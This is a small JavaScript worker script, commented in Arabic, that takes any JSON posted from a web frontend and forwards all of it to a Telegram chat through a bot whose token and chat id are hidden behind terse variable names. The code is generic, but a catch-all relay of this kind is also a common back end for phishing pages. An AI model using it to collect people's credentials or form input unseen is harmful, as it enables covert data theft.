addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  if (request.method !== 'POST') {
    return new Response('Method Not Allowed', { status: 405 })
  }

  try {
    // هذا الجزء يستقبل كل البيانات المرسلة من الواجهة الأمامية
    const data = await request.json();

    // يقوم بتحويل البيانات إلى نص منسق لسهولة القراءة
    const message = JSON.stringify(data, null, 2);

    const telegramApiUrl = `https://api.telegram.org/bot${ab}/sendMessage`;

    const telegramResponse = await fetch(telegramApiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: bc,
        text: message
      })
    });

    if (telegramResponse.ok) {
      return new Response('Success', { status: 200 });
    } else {
      const errorText = await telegramResponse.text();
      console.error('Telegram API error:', errorText);
      return new Response('Failed to send message to Telegram', { status: telegramResponse.status });
    }
  } catch (e) {
    return new Response(`Error: ${e.message}`, { status: 500 });
  }
}
